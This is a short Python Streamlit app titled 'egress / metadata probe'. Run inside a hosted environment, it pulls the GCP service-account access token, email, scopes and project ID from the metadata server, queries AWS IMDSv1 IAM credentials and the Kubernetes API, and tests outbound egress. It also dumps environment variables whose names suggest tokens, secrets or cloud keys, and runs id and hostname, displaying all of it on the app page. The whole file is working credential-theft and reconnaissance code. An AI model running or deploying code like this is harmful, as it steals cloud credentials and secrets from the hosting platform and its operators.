import streamlit as st, urllib.request, socket, os, subprocess

st.title("egress / metadata probe")

def get(url, headers=None, t=4):
    try:
        r = urllib.request.Request(url, headers=headers or {})
        return urllib.request.urlopen(r, timeout=t).read().decode()[:3000]
    except Exception as e:
        return "ERR: " + repr(e)[:400]

md = {"Metadata-Flavor": "Google"}
st.subheader("GCP SA token");   st.code(get("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", md))
st.subheader("GCP SA email");   st.code(get("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email", md))
st.subheader("GCP project");    st.code(get("http://metadata.google.internal/computeMetadata/v1/project/project-id", md))
st.subheader("GCP scopes");     st.code(get("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes", md))
st.subheader("AWS IMDSv1");     st.code(get("http://169.254.169.254/latest/meta-data/iam/security-credentials/"))
st.subheader("k8s API");        st.code(get("https://kubernetes.default.svc/api", t=4))
st.subheader("egress 8.8.8.8:53")
try:
    s = socket.create_connection(("8.8.8.8", 53), timeout=4); st.code("OPEN"); s.close()
except Exception as e:
    st.code("BLOCKED " + repr(e)[:200])
st.subheader("interesting env")
st.code({k: v for k, v in os.environ.items() if any(x in k.upper() for x in ["KUBE","HOST","TOKEN","SECRET","SNOW","STREAMLIT","AWS","GCP","GOOGLE","SERVICE"])})
st.subheader("id / whoami")
try: st.code(subprocess.run(["id"], capture_output=True, text=True).stdout + subprocess.run(["hostname"], capture_output=True, text=True).stdout)
except Exception as e: st.code(repr(e))
